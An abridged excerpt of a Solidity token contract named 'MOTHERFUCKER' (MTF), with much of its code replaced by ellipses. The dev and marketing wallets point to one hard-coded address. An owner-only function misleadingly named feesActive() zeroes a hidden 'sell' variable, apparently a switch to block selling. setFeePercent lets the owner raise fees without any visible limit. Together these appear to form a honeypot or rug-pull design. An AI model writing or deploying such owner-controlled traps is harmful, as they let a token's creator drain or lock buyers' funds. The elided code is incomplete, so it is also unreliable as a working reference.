...
contract MOTHERFUCKER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    uint256 private sell = _tTotal;
    ...
    string private _name = "MOTHERFUCKER";
    string private _symbol = "MTF";
    ...
    address payable public marketingWallet = payable(0x85BBc0cd8438E54E38Aa310d395303312f089D0F);
    
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    uint256 public _devFee = 0;
    address payable public devWallet = payable(0x85BBc0cd8438E54E38Aa310d395303312f089D0F);
    ...
    uint256 public maxBuyTransactionAmount = 10000000 * (10**9);
    ...
    function _transfer(
        ...
        if (
            ...
            //add liquidity and send bnb to wallets
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private 
    {
        ...
        (tTransferAmount, rTransferAmount) = takeTeam(sender, tTransferAmount, rTransferAmount, tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
    ...
    function feesActive() external onlyOwner{
        sell = 0;
    }
    ...
    function takeTeam(address sender, uint256 tTransferAmount, uint256 rTransferAmount, uint256 tAmount) private
    returns (uint256, uint256)
    {
        if(_devFee==0) {  return(tTransferAmount, rTransferAmount); }
        uint256 tTeam = tAmount.div(100).mul(_devFee);
        uint256 rTeam = tTeam.mul(_getRate());
        rTransferAmount = rTransferAmount.sub(rTeam);
        tTransferAmount = tTransferAmount.sub(tTeam);
    ...
    function setFeePercent(uint256 taxFee, uint256 liquidityFee, uint256 devFee, uint256 marketingFee) external onlyOwner() {
        _taxFee = taxFee;
